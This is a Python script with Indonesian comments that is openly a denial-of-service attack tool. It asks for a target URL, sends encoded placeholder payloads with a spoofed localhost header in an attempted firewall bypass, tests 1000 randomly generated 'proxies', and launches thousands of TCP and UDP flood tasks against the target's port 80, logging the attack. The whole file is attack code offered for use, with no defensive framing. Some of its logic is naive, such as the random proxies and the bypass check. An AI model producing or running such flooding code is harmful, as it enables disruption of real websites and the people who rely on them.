import random
import threading
import time
import socket
import os
import requests
import base64
from queue import Queue
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

def start_attack(target_url: str):
    """Memulai serangan dengan brute force proxy dan TCP flood"""

    # Memecah URL dan mengambil domain saja
    parsed_url = urlparse(target_url)
    domain = parsed_url.hostname  # Ambil hostname tanpa http:// atau https://

    target_ip = socket.gethostbyname(domain)  # Mengonversi domain menjadi IP
    target_port = 80  # Port default untuk HTTP

    log_file = create_log_file()
    log_file.write(f"Serangan dimulai pada {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    # Menangani bypass WAF dengan payload encoding terlebih dahulu
    attempt_bypass_waf(target_url, log_file)

    # Brute force proxy
    proxy_list = [generate_proxy() for _ in range(1000)]  # Membuat 1000 proxy acak
    brute_force_proxy(proxy_list, target_url, log_file)

    # Menangani multi-vector attack (TCP dan UDP flood) setelah bypass WAF berhasil
    threads = []
    with ThreadPoolExecutor(max_workers=200) as executor:  # Batasi jumlah thread
        for _ in range(1000):  # Membuat 1000 thread untuk TCP flood
            executor.submit(tcp_flood, target_ip, target_port, log_file)

        for _ in range(1000):  # Membuat 1000 thread untuk UDP flood
            executor.submit(udp_flood, target_ip, target_port, log_file)

    log_file.write(f"Serangan selesai pada {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    log_file.close()

# Fungsi untuk menghasilkan proxy acak
def generate_proxy():
    """Menghasilkan proxy acak dalam format http://ip:port"""
    ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))  # IP acak
    port = random.randint(1080, 65535)  # Port acak
    return f"{ip}:{port}"

# Fungsi untuk menguji apakah proxy valid
def test_proxy(proxy: str, target_url: str, log_file):
    """Mengirim permintaan menggunakan proxy dan menguji apakah berhasil"""
    try:
        response = requests.get(target_url, proxies={"http": proxy, "https": proxy}, timeout=3)
        if response.status_code == 200:
            log_message = f"Proxy valid: {proxy}\n"
            log_file.write(log_message)
        else:
            log_message = f"Proxy tidak valid: {proxy}\n"
            log_file.write(log_message)
    except requests.exceptions.RequestException:
        log_message = f"Proxy gagal: {proxy}\n"
        log_file.write(log_message)

# Fungsi untuk membuat payload WAF dengan encoding
def generate_encoded_payload(payload: str):
    """Membuat payload yang telah diencode untuk melewati WAF"""
    return base64.b64encode(payload.encode()).decode()

# Fungsi untuk mencoba bypass WAF sampai berhasil
def attempt_bypass_waf(target_url: str, log_file):
    """Mencoba bypass WAF dengan berbagai payload hingga berhasil"""
    log_file.write("Mencoba bypass WAF...\n")
    while True:
        payload = "example_payload"  # Sesuaikan payload sesuai kebutuhan
        encoded_payload = generate_encoded_payload(payload)
        log_file.write(f"Menggunakan payload WAF (encoded): {encoded_payload}\n")
        if test_waf_bypass(target_url, encoded_payload, log_file):
            log_file.write("Bypass WAF berhasil!\n")
            break
        else:
            log_file.write("Bypass WAF gagal, mencoba lagi...\n")
            time.sleep(1)  # Menunggu sebentar sebelum mencoba lagi

# Fungsi untuk mengirim permintaan dengan payload untuk menguji WAF
def test_waf_bypass(target_url: str, payload: str, log_file):
    """Menguji apakah payload dapat melewati WAF"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1",  # Meniru request dari localhost
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"username": payload, "password": payload}  # Misalnya serangan pada form login
    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        if response.status_code == 200:
            log_file.write(f"Payload berhasil: {payload}\n")
            return True
        else:
            log_file.write(f"Payload gagal: {payload}\n")
            return False
    except requests.exceptions.RequestException:
        return False

# Fungsi untuk melakukan TCP flood DDoS
def tcp_flood(target_ip: str, target_port: int, log_file):
    """Melakukan TCP flood ke target menggunakan socket"""
    log_file.write(f"Memulai serangan TCP flood ke {target_ip}:{target_port}\n")
    while True:
        try:
            # Membuat socket dan menghubungkan ke target
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(2)  # Set timeout untuk koneksi
            client_socket.connect((target_ip, target_port))
            client_socket.send(b'GET / HTTP/1.1\r\n')  # Mengirimkan permintaan HTTP dummy
            log_file.write(f"TCP flood mengirimkan data ke {target_ip}:{target_port}\n")
            client_socket.close()
        except socket.error as e:
            log_file.write(f"Error pada koneksi TCP: {e}\n")
            break

# Fungsi untuk melakukan UDP flood DDoS
def udp_flood(target_ip: str, target_port: int, log_file):
    """Melakukan UDP flood ke target menggunakan socket"""
    log_file.write(f"Memulai serangan UDP flood ke {target_ip}:{target_port}\n")
    while True:
        try:
            # Membuat socket UDP dan mengirimkan paket dummy
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client_socket.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
            log_file.write(f"UDP flood mengirimkan data ke {target_ip}:{target_port}\n")
        except socket.error as e:
            log_file.write(f"Error pada koneksi UDP: {e}\n")
            break

# Fungsi untuk brute force proxy dengan menggunakan ThreadPoolExecutor
def brute_force_proxy(proxy_list, target_url, log_file):
    """Melakukan brute force pada proxy dengan ThreadPoolExecutor"""
    log_file.write(f"Memulai brute force proxy ke {target_url}\n")
    with ThreadPoolExecutor(max_workers=50) as executor:  # Batasi jumlah thread
        for proxy in proxy_list:
            executor.submit(test_proxy, proxy, target_url, log_file)

# Fungsi untuk membuat log file otomatis
def create_log_file():
    """Membuat file log otomatis"""
    if not os.path.exists("logs"):
        os.makedirs("logs")
    log_filename = f"logs/ddos_attack_{int(time.time())}.log"
    log_file = open(log_filename, "a")
    return log_file

# Menjalankan serangan
if __name__ == "__main__":
    target_url = input("Masukkan URL target (misalnya http://example.com): ")
    start_attack(target_url)
